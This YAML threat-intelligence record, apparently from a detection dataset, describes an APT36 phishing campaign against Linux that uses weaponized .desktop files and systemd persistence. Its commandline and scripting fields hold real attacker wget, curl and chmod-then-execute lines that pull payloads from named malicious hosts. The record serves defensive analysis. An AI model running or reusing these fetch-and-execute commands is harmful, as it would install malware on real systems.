description: "APT36 (Transparent Tribe) executed a Linux\u2011targeted phishing campaign\
  \ using weaponized .desktop files that staged ELF and shell payloads, establishing\
  \ persistence via systemd services."
attribution: APT36 / Transparent Tribe
TTPs:
  processes:
  - swcbc
  - swcbc.sh
  - Analysis_Proc_Report_Gem.desktop
  commandline:
  - '''/tmp/swcbc'' executed after chmod +x'
  - '''/tmp/swcbc.sh'' executed after chmod +x'
  - libreoffice '/tmp/Analysis_Proc_Report_Gem.pdf'
  - curl -o /tmp/Analysis_Proc_Report_Gem.pdf 'http://lionsdenim.xyz/in/Analysis_Proc_Report_Gem.pdf'
  - wget -O /tmp/swcbc 'http://185.235.137.90:32587/uploads/yash10_52228826567/swcbc'
  - wget -O /tmp/swcbc.sh 'http://185.235.137.90:32587/uploads/yash10_52228826567/swcbc.sh'
  powershell: []
  scripting_engine:
  - '# Bash script to download and execute payloads'
  - cd /tmp && chmod +x swcbc swcbc.sh && ./swcbc & ./swcbc.sh & libreoffice /tmp/Analysis_Proc_Report_Gem.pdf
  registry_keys: []
  image_load: []
  network_connections:
  - process: wget
    destination: 185.235.137.90
    port: 32587
  - process: curl
    destination: lionsdenim.xyz
    port: 80
  - process: libreoffice
    destination: localhost
    port: null
  file_activity:
  - /tmp/Analysis_Proc_Report_Gem.pdf
  - /tmp/swcbc
  - /tmp/swcbc.sh
  - ~/.swcbc/
  persistence:
  - Create systemd user service in ~/.config/systemd/user/
  - Enable and start the service to run swcbc at login
  process_relations: []
